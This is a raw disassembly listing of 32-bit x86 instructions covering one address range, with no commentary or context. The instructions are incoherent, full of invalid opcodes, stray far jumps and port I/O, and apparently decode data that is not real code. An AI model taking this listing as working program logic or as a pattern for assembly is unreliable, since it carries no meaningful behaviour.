  41fcf7:	test   al,0xb5
  41fcf9:	jno    0x41fcd4
  41fcfb:	rcr    DWORD PTR [ecx],1
  41fcfd:	push   ss
  41fcfe:	arpl   WORD PTR ss:[edx-0x68561605],sp
  41fd05:	mov    edx,0x497ea1b8
  41fd0a:	repnz mov ebx,0x5d4c920c
  41fd10:	cdq    
  41fd11:	push   ds
  41fd12:	shl    ebp,0x30
  41fd15:	push   eax
  41fd16:	push   ds
  41fd17:	jnp    0x41fd2d
  41fd19:	mov    bl,BYTE PTR [esi]
  41fd1b:	jbe    0x41fd07
  41fd1d:	push   edx
  41fd1e:	pop    ecx
  41fd1f:	mul    DWORD PTR [ebp-0x6d]
  41fd22:	aad    0x9f
  41fd24:	repnz and eax,0x60e13304
  41fd2a:	sbb    ebx,DWORD PTR [ebp+0x30da5bd1]
  41fd30:	inc    ebx
  41fd31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd33:	outs   dx,BYTE PTR ds:[esi]
  41fd34:	sub    al,0x83
  41fd36:	inc    ecx
  41fd37:	scas   al,BYTE PTR es:[edi]
  41fd38:	(bad)  
  41fd39:	fistp  WORD PTR [edi]
  41fd3b:	stos   DWORD PTR es:[edi],eax
  41fd3c:	cmc    
  41fd3d:	mov    ds:0x64dc131e,eax
  41fd42:	cwde   
  41fd43:	hlt    
  41fd44:	push   esp
  41fd45:	outs   dx,DWORD PTR ds:[esi]
  41fd46:	retf   0x5786
  41fd49:	push   ebp
  41fd4a:	sar    DWORD PTR [ebx-0x6b],cl
  41fd4d:	(bad)  
  41fd4e:	jmp    0xb483:0x8cf04636
  41fd55:	xor    edi,DWORD PTR [edx+0x16]
  41fd58:	pop    ebx
  41fd59:	push   es
  41fd5a:	ds scas eax,DWORD PTR es:[edi]
  41fd5c:	sbb    eax,0x27374f2
  41fd61:	add    eax,0x112316ed
  41fd66:	dec    ecx
  41fd67:	mov    al,0xf9
  41fd69:	out    dx,eax
  41fd6a:	jg     0x41fd36
  41fd6c:	pop    ebp
  41fd6d:	pop    ebx
  41fd6e:	push   0x918dd126
  41fd73:	or     DWORD PTR [ebp+0x79],0xfffffff1
  41fd77:	xor    al,0x45
  41fd79:	int    0x24
  41fd7b:	push   ecx
  41fd7c:	jp     0x41fdb4
  41fd7e:	pop    edi
  41fd7f:	mov    WORD PTR [esi],es
  41fd81:	push   ecx
  41fd82:	jmp    0x221adb3b
  41fd87:	loop   0x41fda5
  41fd89:	cmc    
  41fd8a:	sti    
  41fd8b:	jecxz  0x41fd22
  41fd8d:	dec    ecx
  41fd8f:	aam    0x4
  41fd91:	pop    ds
  41fd92:	or     eax,0x8d7d4ff5
  41fd97:	outs   dx,DWORD PTR ds:[esi]
  41fd98:	out    0xae,eax
  41fd9a:	addr16 out dx,eax
  41fd9c:	loop   0x41fd80
  41fd9e:	inc    esp
  41fd9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda0:	push   esp
  41fda1:	adc    dl,BYTE PTR [edx-0x14a0e29c]
  41fda7:	(bad)  
  41fda8:	test   al,0x1b
  41fdaa:	xor    eax,0x5652feb8
  41fdaf:	add    eax,0xf89ee8a3
  41fdb4:	pop    ebx
  41fdb5:	loop   0x41fd88
  41fdb7:	push   ebx
  41fdb8:	out    0x12,al
  41fdba:	fsubr  DWORD PTR [ecx+0x49]
  41fdbd:	jmp    0xbbfa:0xbe663680
  41fdc4:	das    
  41fdc5:	int3   
  41fdc6:	mov    ds:0x70ddcb7e,eax
  41fdcb:	stos   BYTE PTR es:[edi],al
  41fdcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdcd:	and    BYTE PTR [edi-0x7d9cebff],dl
  41fdd3:	enter  0x8425,0x9a
  41fdd7:	fst    QWORD PTR [eax-0xc]
  41fdda:	sub    al,0x3b
  41fddc:	xchg   esp,eax
  41fddd:	push   esp
  41fdde:	in     al,dx
  41fddf:	add    BYTE PTR [ecx-0x19ee6d6d],ch
  41fde5:	mov    esp,0x96a3d75a
  41fdea:	call   0xb472:0x3015de5d
  41fdf1:	aam    0xa1
  41fdf3:	je     0x41fe41
  41fdf5:	jmp    0x4f88ea40
  41fdfa:	mov    fs,edx
  41fdfc:	loope  0x41fde8
  41fdfe:	sbb    BYTE PTR [ebx+0x58b9f5a],0xf5
  41fe05:	jmp    0x41fdea
  41fe07:	retf   0x83f7
  41fe0a:	jp     0x41fdb4
  41fe0c:	repz lds edx,FWORD PTR [ebx]
  41fe0f:	or     BYTE PTR [ecx+esi*8+0x5f],dh
  41fe13:	inc    esp
  41fe14:	jbe    0x41fe15
  41fe16:	push   edx
  41fe17:	push   ds
  41fe18:	push   edi
  41fe19:	adc    eax,DWORD PTR [ebx]
  41fe1b:	addr16 (bad) 
  41fe1d:	cmp    BYTE PTR [edx+0x16],bh
  41fe20:	mov    ecx,0x5bc8ea9b
  41fe25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe26:	cs mov dl,0xdb
  41fe29:	and    DWORD PTR [ebx-0x1b85ccf0],ebx
  41fe2f:	and    BYTE PTR ds:0x957e22f0,ah
  41fe35:	sub    DWORD PTR [edi+eax*8+0x49],ecx
  41fe39:	aaa    
  41fe3a:	sbb    ecx,DWORD PTR [edi-0x72c4f2e1]
  41fe40:	xchg   ebp,eax
  41fe41:	cdq    
  41fe42:	mov    ds:0xa574ce6c,al
  41fe47:	mov    esp,0xd4906642
  41fe4c:	out    dx,al
  41fe4d:	pavgw  mm6,QWORD PTR [edi+0x7de6ceea]
  41fe54:	xor    ah,ch
  41fe56:	push   esi
  41fe57:	pop    eax
  41fe58:	mov    ds:0xee20545d,eax
  41fe5d:	pusha  
  41fe5e:	sbb    eax,0x3ad834a6
  41fe63:	mov    bh,0x99
  41fe65:	call   0x4859bc54
  41fe6a:	push   0xffffffaf
  41fe6c:	bound  esi,QWORD PTR [esi+0x42]
  41fe6f:	push   cs
  41fe70:	xchg   esi,eax
  41fe71:	cmp    al,0x1f
  41fe73:	bound  esp,QWORD PTR [edx+0x408e12a0]
  41fe79:	jg     0x41fede
  41fe7b:	stos   DWORD PTR es:[edi],eax
  41fe7c:	ins    BYTE PTR es:[edi],dx
  41fe7d:	ficomp WORD PTR [esp+ebp*8-0x62]
  41fe81:	add    al,0x8d
  41fe83:	ins    BYTE PTR es:[edi],dx
  41fe84:	xor    al,0x55
  41fe86:	sub    BYTE PTR [ebx],cl
  41fe88:	int    0x34
  41fe8a:	and    eax,0xd9d9acfb
  41fe8f:	jns    0x41fe38
  41fe91:	dec    ebp
  41fe92:	pushf  
  41fe93:	inc    ecx
  41fe94:	cmc    
  41fe95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe96:	pushf  
  41fe97:	icebp  
  41fe98:	stc    
  41fe99:	dec    ebp
  41fe9a:	out    dx,eax
  41fe9b:	jnp    0x41fe3b
  41fe9d:	fistp  DWORD PTR [ebx+0x6e]
  41fea0:	fdivr  st(7),st
  41fea2:	push   ecx
  41fea3:	sbb    ebp,DWORD PTR [eax+esi*4]
  41fea6:	pusha  
  41fea7:	pop    esi
  41fea8:	xchg   ebp,eax
  41fea9:	pop    es
  41feaa:	js     0x41fe91
  41feac:	cld    
  41fead:	in     al,0x92
  41feaf:	mov    al,ds:0x779b98b5
  41feb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb5:	xor    cl,al
  41feb7:	stos   DWORD PTR es:[edi],eax
  41feb8:	xchg   esp,eax
  41feb9:	and    DWORD PTR [eax-0x4acf1d29],edx
  41febf:	jp     0x41ff13
  41fec1:	shl    DWORD PTR [edi],cl
  41fec3:	adc    esp,DWORD PTR [ebx-0x73043158]
  41fec9:	push   edx
  41feca:	dec    ecx
  41fecb:	mul    BYTE PTR ds:0x16873f08
  41fed1:	js     0x41fee2
  41fed3:	push   0xffffff82
  41fed5:	dec    ebp
  41fed6:	add    eax,0x50e05479
  41fedb:	repnz imul eax,DWORD PTR [edi+0x67d25695],0xbcb851b4
  41fee6:	push   ebp
  41fee7:	xchg   BYTE PTR [ebx],ch
  41fee9:	pop    ds
  41feea:	arpl   si,cx
  41feec:	popf   
  41feed:	rcr    ch,0x37
  41fef0:	mov    al,ds:0xb9a48f6
  41fef5:	ror    bh,cl
  41fef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef8:	lods   al,BYTE PTR ds:[esi]
  41fef9:	jnp    0x41feb5
  41fefb:	aam    0x8d
  41fefd:	xchg   edx,eax
  41fefe:	icebp  
  41feff:	dec    esp
  41ff00:	and    eax,0xae87d1b7
  41ff05:	cmp    esi,esp
  41ff07:	imul   esp,DWORD PTR [edi+0x69],0x95b012e9
  41ff0e:	cwde   
  41ff0f:	les    ebx,FWORD PTR [ecx+0x742b7613]
  41ff15:	dec    ebx
  41ff16:	test   DWORD PTR [esi-0x5f],edx
  41ff19:	js     0x41ff12
  41ff1b:	pop    ebx
  41ff1c:	jge    0x41fed4
  41ff1e:	leave  
  41ff1f:	cmc    
  41ff20:	iret   
  41ff21:	lock sub al,0x8
  41ff24:	(bad)  
  41ff25:	push   0x34775408
  41ff2a:	push   eax
  41ff2b:	std    
  41ff2c:	repz ret 0xf65c
  41ff30:	outs   dx,BYTE PTR ds:[esi]
  41ff31:	mov    ebx,0xe4577f5a
  41ff36:	ins    DWORD PTR es:[edi],dx
  41ff37:	mov    ebp,0x6da372e
  41ff3c:	mov    dl,0x6d
  41ff3e:	mov    dh,0x14
  41ff40:	shl    DWORD PTR [edx-0x1],0x68
  41ff44:	pop    edx
  41ff45:	push   edx
  41ff46:	das    
  41ff47:	adc    eax,0x8d94362c
  41ff4c:	hlt    
  41ff4d:	mov    esi,0xe5a615b
  41ff52:	mov    bh,BYTE PTR [eax+0x6c98dc99]
  41ff58:	sbb    BYTE PTR [edx],0xeb
  41ff5b:	sub    edi,DWORD PTR [edi-0x20]
  41ff5e:	test   DWORD PTR [ecx+0x261ec59b],eax
  41ff64:	jmp    0x83e8056e
  41ff69:	cmp    dl,BYTE PTR [ebx+ecx*2+0x570370f4]
  41ff70:	mov    ecx,edx
  41ff72:	dec    esi
  41ff73:	pop    edx
  41ff74:	or     BYTE PTR [ecx+0x3d706f05],ah
  41ff7a:	add    edi,DWORD PTR [ebp+eax*2-0x5797abc8]
  41ff81:	(bad)  
  41ff82:	push   ebp
  41ff83:	add    esi,esp
  41ff85:	mov    ds,WORD PTR [edx+0x3e309bdd]
  41ff8b:	data16 out dx,al
  41ff8d:	jle    0x41ff40
  41ff8f:	mov    esi,0xfbe2fe80
  41ff94:	cmp    BYTE PTR [ebp-0x7e],ah
  41ff97:	addr16 push eax
  41ff99:	push   cs
  41ff9a:	out    dx,eax
  41ff9b:	jge    0x41fffa
  41ff9d:	loope  0x41ffa7
  41ff9f:	lods   eax,DWORD PTR ds:[esi]
  41ffa0:	push   ds
  41ffa1:	jg     0x41ff5d
  41ffa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffa4:	xor    DWORD PTR [ecx+eax*1],eax
  41ffa7:	and    BYTE PTR [ecx+0x68],bl
  41ffaa:	xchg   DWORD PTR [ebx-0x7401810],edx
  41ffb0:	xor    dl,ah
  41ffb2:	pop    ss
  41ffb3:	je     0x41ff9c
  41ffb5:	inc    edx
  41ffb6:	ja     0x41ffd5
  41ffb8:	hlt    
  41ffb9:	cld    
  41ffba:	cmp    DWORD PTR [esi+0x31d2328a],ebp
  41ffc0:	aas    
  41ffc1:	mov    cl,0x12
  41ffc3:	(bad)  
  41ffc4:	jge    0x41ff86
  41ffc6:	mov    edx,0xfce8c22d
  41ffcb:	arpl   sp,bp
  41ffcd:	cwde   
  41ffce:	mov    esp,0xa6393020
  41ffd3:	push   ebx
  41ffd4:	or     edx,ebp
  41ffd6:	dec    edx
  41ffd7:	lods   al,BYTE PTR ds:[esi]
  41ffd8:	inc    edx
  41ffd9:	or     ebp,edx
  41ffdb:	add    bh,bh
  41ffdd:	or     eax,0xa885928d
  41ffe2:	loop   0x41ff6b
  41ffe4:	push   ds
  41ffe5:	hlt    
  41ffe6:	mov    esp,0xcf609718
  41ffeb:	mov    ebp,0xbabf7ab0
  41fff0:	add    eax,0xf97662ed
  41fff5:	retf   0x7774
  41fff8:	add    edx,DWORD PTR [edx+edx*8-0x7d]
  41fffc:	outs   dx,DWORD PTR ds:[esi]
  41fffd:	mov    eax,ds:0x305beca5
  420002:	mov    dh,0xb1
  420004:	mov    bl,0xe0
  420006:	addr16 pop edx
  420008:	xor    DWORD PTR [eax],eax
  42000a:	jns    0x420069
  42000c:	loop   0x420025
  42000e:	mov    ds:0x3116674b,eax
  420013:	test   eax,0xc4c1a148
  420018:	out    dx,eax
  420019:	sar    DWORD PTR [eax],1
  42001b:	or     DWORD PTR [esi],edi
  42001d:	and    DWORD PTR [edi],ebx
  42001f:	movlps xmm5,QWORD PTR [ebp+0x75]
  420023:	or     eax,0x9809d3c4
  420028:	xchg   esi,eax
  420029:	shl    DWORD PTR [edx+0x35],0xb5
  42002d:	test   al,0xf5
  42002f:	sub    esi,eax
  420031:	popf   
  420032:	inc    ecx
  420033:	retf   
  420034:	dec    ebp
  420035:	mov    ebx,0xb6d456a1
  42003a:	ret    
  42003b:	ins    DWORD PTR es:[edi],dx
  42003c:	test   al,0xfa
  42003e:	pop    ebp
  42003f:	ret    0x9735
  420042:	imul   esp,DWORD PTR [eax+0x3aaa1d90],0xffffff8e
  420049:	ja     0x420056
  42004b:	ret    0x37c9
  42004e:	jp     0x42005d
  420050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420051:	loop   0x41ffe4
  420053:	push   0xffffffd2
  420055:	cdq    
  420056:	adc    eax,0xe52cfda2
  42005b:	cmp    BYTE PTR [eax+0x40fc60d],ch
  420061:	pop    esi
  420062:	add    al,0xb0
  420064:	stc    
  420065:	sbb    ecx,DWORD PTR [ebx-0x794a870]
  42006b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42006c:	or     edi,DWORD PTR [ebp-0x71]
  42006f:	and    BYTE PTR [edx+0x56],ch
  420072:	push   eax
  420073:	add    bh,bl
  420075:	icebp  
  420076:	test   al,0x12
  420078:	cmc    
  420079:	pop    eax
  42007a:	sar    BYTE PTR [ebp+0x4e],cl
  42007d:	mov    esi,0xe7b48b5b
  420082:	pusha  
  420083:	push   ebx
  420084:	lds    esi,FWORD PTR ds:0x18b94d5e
  42008a:	pop    esi
  42008b:	xchg   esi,eax
  42008c:	dec    edx
  42008d:	adc    eax,0x59156afc
  420092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420093:	mov    ah,BYTE PTR [ebp+0x4f]
  420096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420097:	push   cs
  420098:	dec    edx
  420099:	cdq    
  42009a:	mov    esp,0xca055a25
  42009f:	push   edx
  4200a0:	sbb    eax,0xd603d632
  4200a5:	push   edx
  4200a6:	pushf  
  4200a7:	push   0x2a18ef4d
  4200ac:	pop    esi
  4200ad:	xchg   esi,eax
  4200ae:	xchg   BYTE PTR [esi-0x61],bl
  4200b1:	stc    
  4200b2:	push   cs
  4200b3:	jb     0x4200ea
  4200b5:	and    al,0xf1
  4200b7:	loop   0x42003f
  4200b9:	or     edx,DWORD PTR [esi+0x324bd450]
  4200bf:	scas   al,BYTE PTR es:[edi]
  4200c0:	add    DWORD PTR [ecx-0x12dfe03a],eax
  4200c6:	dec    esp
  4200c7:	fdivr  DWORD PTR [ebp-0x66bfcb8e]
  4200cd:	mov    al,0x10
  4200cf:	shl    ebx,cl
  4200d1:	add    edx,ebx
  4200d3:	rol    DWORD PTR [edi+0x2f49d080],cl
  4200d9:	jecxz  0x420148
  4200db:	ret    0x2775
  4200de:	jp     0x420062
  4200e0:	out    0xcc,eax
  4200e2:	loopne 0x42009b
  4200e4:	ficom  WORD PTR [eax]
  4200e6:	setne  BYTE PTR ds:0xfe906b6f
  4200ed:	test   eax,0x63e9dbdb
  4200f2:	(bad)  
  4200f3:	fucomip st,st(2)
  4200f5:	mov    al,ds:0xab19d82b
  4200fa:	or     dh,cl
  4200fc:	data16 add ch,ah
  4200ff:	sub    dl,BYTE PTR [ecx+0x78c14dfc]
  420105:	loopne 0x4200d3
  420107:	pop    esi
  420108:	mov    ds:0xb8919c75,al
  42010d:	adc    BYTE PTR [edi-0x25470f91],al
  420113:	leave  
  420114:	call   0x270f73b5
  420119:	jne    0x420166
  42011b:	popf   
  42011c:	cwde   
  42011d:	lock fsubr DWORD PTR [ebx+0x54]
  420121:	jb     0x42017d
  420123:	aas    
  420124:	dec    edx
  420125:	rcr    DWORD PTR [ebx-0x35980f36],cl
  42012b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42012c:	fdivr  st(2),st
  42012e:	test   al,0x20
  420130:	inc    esp
  420131:	popf   
  420132:	pop    esp
  420133:	ret    0x5978
  420136:	cmp    eax,0x28ba7fe9
  42013b:	jo     0x420180
  42013d:	cmp    ch,ch
  42013f:	inc    esp
  420140:	daa    
  420141:	inc    edx
  420142:	test   BYTE PTR [ecx+eax*4-0x222f6050],bl
  420149:	sub    bl,BYTE PTR [edx-0x6e83d5fc]
  42014f:	xor    esp,eax
  420151:	xor    DWORD PTR [ebp+0x56],ebx
  420154:	mov    esi,DWORD PTR [eax+esi*1+0x735e5348]
  42015b:	mov    es,ecx
  42015d:	xchg   edx,eax
  42015e:	std    
  42015f:	and    eax,0xf4ded65e
  420164:	loopne 0x420109
  420166:	sbb    eax,0x23d7fc8c
  42016b:	push   eax
  42016c:	xchg   edi,eax
  42016d:	out    0x84,eax
  42016f:	lahf   
  420170:	inc    eax
  420171:	mov    gs,WORD PTR [esi+edx*2-0x16]
  420175:	setle  BYTE PTR [edi]
  420178:	push   es
  420179:	adc    bl,BYTE PTR ds:0x35832134
  42017f:	or     BYTE PTR [ecx+0x6b9d90d3],dl
  420185:	dec    esp
  420186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420187:	sbb    DWORD PTR [eax-0x4c28ce1d],edi
  42018d:	gs and eax,0xb313035
  420193:	jl     0x420200
  420195:	mov    WORD PTR [ebx],fs
  420197:	fmulp  st(3),st
  420199:	cmp    DWORD PTR [edx+0x3c],eax
  42019c:	sbb    DWORD PTR [esi],ecx
  42019e:	stc    
  42019f:	inc    edx
  4201a0:	int3   
  4201a1:	cmp    esi,edx
  4201a3:	mov    ebp,0x4b6b81ac
  4201a8:	sbb    al,0xe9
  4201aa:	mov    ecx,0x8f574646
  4201af:	sbb    esi,DWORD PTR [ebx+0x8]
  4201b2:	pop    es
  4201b3:	(bad)  ds:0xec5e0163
  4201b9:	mul    DWORD PTR [ecx]
  4201bb:	ins    BYTE PTR es:[edi],dx
  4201bc:	sbb    BYTE PTR [ecx-0x38],dl
  4201bf:	in     al,0x36
  4201c1:	mov    bh,0xff
  4201c3:	jg     0x4201cf
  4201c5:	jne    0x420165
  4201c7:	adc    ecx,edi
  4201c9:	fnstenv [esi-0x37]
  4201cc:	mov    cl,0x9e
  4201ce:	sub    al,0x7a
  4201d0:	mov    dh,0xa5
  4201d2:	popf   
  4201d3:	lock cmc 
  4201d5:	shl    DWORD PTR [eax-0x3c],1
  4201d8:	jbe    0x420163
  4201da:	mov    ch,0xed
  4201dc:	jo     0x420179
  4201de:	lahf   
  4201df:	sub    ch,0x59
  4201e2:	sub    BYTE PTR [edx+0x1],cl
  4201e5:	mov    esp,0x5b6c3238
  4201ea:	pushf  
  4201eb:	mov    dh,0x88
  4201ed:	lds    ebx,FWORD PTR [ebx]
  4201ef:	sub    ch,BYTE PTR [ecx]
  4201f1:	pop    ebp
  4201f2:	in     al,dx
  4201f3:	xchg   ebp,eax
  4201f4:	dec    esp
  4201f5:	and    al,BYTE PTR [ebx-0x70]
  4201f8:	pop    ebx
  4201f9:	jmp    0x420225
  4201fb:	pop    ebp
  4201fc:	xchg   ebx,eax
  4201fd:	scas   eax,DWORD PTR es:[edi]
  4201fe:	sub    eax,0xb755a56f
  420203:	xor    eax,0x1f6fb933
  420208:	dec    ebp
  420209:	pop    eax
  42020a:	call   FWORD PTR [esi+0x22a06726]
  420210:	dec    esp
  420211:	imul   eax,edi,0x3580d515
  420217:	jp     0x420216
  420219:	add    BYTE PTR [eax],0x8
  42021c:	jno    0x420226
  42021e:	mov    edx,ebp
  420220:	dec    ebx
  420221:	sub    BYTE PTR [edx-0x3752edff],dh
  420227:	pop    ds
  420228:	and    al,0x3e
  42022a:	push   ecx
  42022b:	(bad)  
  42022d:	mov    ds:0x7dad919a,al
  420232:	jbe    0x42026b
  420234:	inc    esp
  420235:	dec    DWORD PTR [edi+0x7a]
  420238:	aam    0x66
  42023a:	mov    ebx,DWORD PTR [edx+esi*4+0x38466907]
  420241:	sub    ebx,DWORD PTR [edx+esi*2]
  420244:	pop    esp
  420245:	and    DWORD PTR [edi-0x3e7cf72e],ebx
  42024b:	push   edi
  42024c:	imul   esp,ebp,0xffffffc6
  42024f:	pop    ebx
  420250:	xor    DWORD PTR [ebp+0x55],0x57322750
  420257:	adc    al,0xb3
  420259:	leave  
  42025a:	(bad)  
  42025b:	(bad)  
  42025c:	or     eax,0xb16ec10b
  420261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420262:	cmp    BYTE PTR [ecx+0x4c],bh
  420265:	xchg   edi,eax
  420266:	inc    eax
  420267:	push   cs
  420268:	dec    esi
  420269:	push   ebp
  42026a:	lods   eax,DWORD PTR ds:[esi]
  42026b:	mov    ah,0x94
  42026d:	adc    cl,BYTE PTR [edx]
  42026f:	es jne 0x420218
  420272:	push   ecx
  420273:	popf   
  420274:	in     eax,0x1b
  420276:	inc    ecx
  420277:	xchg   dl,cl
  420279:	icebp  
  42027a:	das    
  42027b:	cmp    edx,DWORD PTR [ecx-0x57]
  42027e:	fwait
  42027f:	jle    0x4202f3
  420281:	sub    al,0xfa
  420283:	pop    ebp
  420284:	in     al,dx
  420285:	adc    al,0x89
  420287:	mov    bl,0x7b
  420289:	das    
  42028a:	fbld   TBYTE PTR [ebx+0x9]
  42028d:	xor    BYTE PTR [ecx],dl
  42028f:	fsub   DWORD PTR [edx]
  420291:	loope  0x420239
  420293:	(bad)  
  420294:	addr16 repnz cmc 
  420297:	lods   al,BYTE PTR ds:[esi]
  420298:	sbb    al,0xe5
  42029a:	ja     0x420278
  42029c:	xchg   ecx,eax
  42029d:	retf   0xe1c3
  4202a0:	cmp    BYTE PTR [eax],al
  4202a2:	mov    dh,0xb
  4202a4:	scas   eax,DWORD PTR es:[edi]
  4202a5:	push   edi
  4202a6:	xchg   edx,eax
  4202a7:	add    esp,DWORD PTR [ebx]
  4202a9:	mov    edi,0xd83c984b
  4202ae:	fisttp DWORD PTR [ecx-0x13]
  4202b1:	sahf   
  4202b2:	inc    BYTE PTR [edx]
  4202b4:	ins    BYTE PTR es:[edi],dx
  4202b5:	sub    DWORD PTR [ebx-0x5867de02],ebp
  4202bb:	pop    es
  4202bc:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4202be:	aad    0x63
  4202c0:	xor    eax,0xbb8d2a40
  4202c5:	xchg   bp,ax
  4202c7:	mul    BYTE PTR [edi+0x10f84385]
  4202cd:	adc    al,0xf2
  4202cf:	js     0x42030e
  4202d1:	and    cl,BYTE PTR [ebx-0x11f1d087]
  4202d7:	jns    0x420327
  4202d9:	in     eax,dx
  4202da:	sbb    ebx,DWORD PTR [ebx+0x29f2dd73]
  4202e0:	mov    BYTE PTR ds:0xe46da13d,bh
  4202e6:	add    DWORD PTR [edx],ebx
  4202e8:	not    DWORD PTR [ebx+0x56]
  4202eb:	sti    
  4202ec:	retf   
  4202ed:	je     0x420324
  4202ef:	sub    edi,DWORD PTR [ecx+0x73]
  4202f2:	out    dx,eax
  4202f3:	mov    dh,BYTE PTR [esi]
  4202f5:	mov    dh,0x3f
  4202f7:	pop    esp
  4202f8:	enter  0x6f92,0x90
  4202fc:	xor    BYTE PTR [ecx],bh
  4202fe:	rol    BYTE PTR [eax],0x76
  420301:	cwde   
  420302:	and    al,0x64
  420304:	bound  eax,QWORD PTR gs:[eax-0x66]
  420308:	fild   WORD PTR [edx]
  42030a:	sahf   
  42030b:	popw   ss
  42030d:	dec    ecx
  42030e:	(bad)  
  42030f:	ds xchg edx,eax
  420311:	fnstcw WORD PTR [ebp-0x33]
  420314:	jmp    0x951f:0xf5545bc4
  42031b:	xor    eax,0x6bf75fc
  420320:	add    al,0xa7
  420322:	xor    al,0x3f
  420324:	mov    al,ds:0x83777df9
  420329:	add    cl,BYTE PTR [edi+esi*4-0x55]
  42032d:	xor    al,0xb4
  42032f:	sbb    eax,0xafe146f5
  420334:	jl     0x42031e
  420336:	xchg   ebx,eax
  420337:	out    0x2d,al
  420339:	cdq    
  42033a:	lods   al,BYTE PTR ds:[esi]
  42033b:	shr    DWORD PTR [ebp*4+0x226dabb5],1
  420342:	dec    esp
  420343:	pushf  
  420344:	dec    esi
  420345:	lds    edi,FWORD PTR [ecx-0x43d655d1]
  42034b:	rol    BYTE PTR [ecx+0x52],0x85
  42034f:	and    BYTE PTR [edx],al
  420351:	or     bh,BYTE PTR [ebp-0x6b]
  420354:	pushf  
  420355:	xchg   edx,eax
  420356:	pop    ds
  420357:	or     eax,0x30e0b918
  42035c:	mov    ah,0xfb
  42035e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42035f:	push   cs
  420360:	inc    esi
  420361:	test   eax,0x30d40fa8
  420366:	mov    edx,eax
  420368:	sbb    DWORD PTR [ebx],ecx
  42036a:	fisttp WORD PTR [ecx-0x1bbe5585]
  420370:	cdq    
  420371:	loopne 0x42035d
  420373:	cmp    edi,edi
  420375:	addr16 dec eax
  420377:	xchg   edx,eax
  420378:	and    BYTE PTR [edx],dh
  42037a:	adc    eax,0xc7bbdc1e
  42037f:	mov    ecx,0x83cb626e
  420384:	cmp    eax,0xcdd5ae1b
  420389:	les    esi,FWORD PTR [edx]
  42038b:	and    cl,BYTE PTR [ebp-0x67]
  42038e:	popf   
  42038f:	mov    ds:0x9222bfd3,al
  420394:	mov    esi,0xb335fb29
  420399:	cli    
  42039a:	and    al,0x72
  42039c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42039d:	loop   0x4203d6
  42039f:	std    
  4203a0:	adc    dl,BYTE PTR [edi+0x17]
  4203a3:	in     al,dx
  4203a4:	xlat   BYTE PTR ds:[ebx]
  4203a5:	(bad)  
  4203a6:	xor    bh,dh
  4203a8:	jecxz  0x420361
  4203aa:	ss jbe 0x420379
  4203ad:	sbb    BYTE PTR [ebx],0x23
  4203b0:	(bad)  
  4203b1:	jg     0x420333
  4203b3:	push   cs
  4203b4:	pop    ecx
  4203b5:	mov    eax,0xd5d03af2
  4203ba:	push   ds
  4203bb:	xchg   esi,eax
  4203bc:	add    eax,0x9eb71bb1
  4203c1:	add    BYTE PTR [edx-0x3851b5],0x7
  4203c8:	sbb    ecx,eax
  4203ca:	popa   
  4203cb:	cmp    al,0x2c
  4203cd:	and    DWORD PTR [ecx+0x7e6d3df5],ecx
  4203d3:	dec    esi
  4203d4:	sub    BYTE PTR [edi-0xa],0xbf
  4203d8:	cmp    ch,BYTE PTR ds:0x525f0b69
  4203de:	inc    eax
  4203df:	imul   ebx
  4203e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203e2:	pop    ss
  4203e3:	push   ecx
  4203e4:	jp     0x42042b
  4203e6:	cld    
  4203e7:	stc    
  4203e8:	dec    eax
  4203e9:	ret    0xc685
  4203ec:	push   ebp
  4203ed:	js     0x420397
  4203ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203f0:	push   esp
  4203f1:	sbb    eax,0x27506564
  4203f6:	not    esp
  4203f8:	sbb    edx,DWORD PTR [ebx-0x57e6f0a0]
  4203fe:	ja     0x420445
  420400:	jmp    0x4203c8
  420402:	inc    ebx
  420403:	pop    ecx
  420404:	gs or  dl,bh
  420407:	cmp    eax,0xf07c5339
  42040c:	adc    al,0x71
  42040e:	jle    0x4203a8
  420410:	into   
  420411:	repnz cmp eax,0x5c97d97e
  420417:	jmp    0x9130:0xc7e82bde
  42041e:	jecxz  0x420474
  420420:	push   eax
  420421:	ret    0xec00
  420424:	pop    ds
  420425:	repz (bad) 
  420427:	loope  0x420452
  420429:	pop    esp
  42042a:	cdq    
  42042b:	fimul  WORD PTR [ecx+0x5e55ab7]
  420431:	sub    bl,0x2f
  420434:	jle    0x4203f5
  420436:	out    0x92,al
  420438:	jo     0x4203cb
  42043a:	iret   
  42043b:	vpminub xmm2,xmm4,XMMWORD PTR [eax]
  42043f:	adc    BYTE PTR [eax-0x7f2b0090],0xed
  420446:	mov    ds:0xf2e44a00,eax
  42044b:	xor    eax,0x2280af3e
  420450:	sahf   
  420451:	xchg   ecx,eax
  420452:	fld    DWORD PTR [eax+0x1c33d192]
  420458:	mov    ds:0xbe82b07f,eax
  42045d:	shl    BYTE PTR [esi-0x3282a178],1
  420463:	aam    0xa2
  420465:	pop    ebx
  420466:	shl    BYTE PTR [edi-0xe7c4dc3],1
  42046c:	repnz out 0x77,eax
  42046f:	stos   DWORD PTR es:[edi],eax
  420470:	data16 into 
  420472:	xlat   BYTE PTR ds:[ebx]
  420473:	cmp    ebx,edi
  420475:	sar    BYTE PTR [esi-0x51],0x99
  420479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42047a:	push   ebp
  42047b:	(bad)  
  42047c:	jnp    0x420477
  42047e:	pop    ss
  42047f:	sbb    DWORD PTR [esi+0x6be330ba],0xffffffd5
  420486:	mov    ecx,0x228127de
  42048b:	jmp    0x42049a
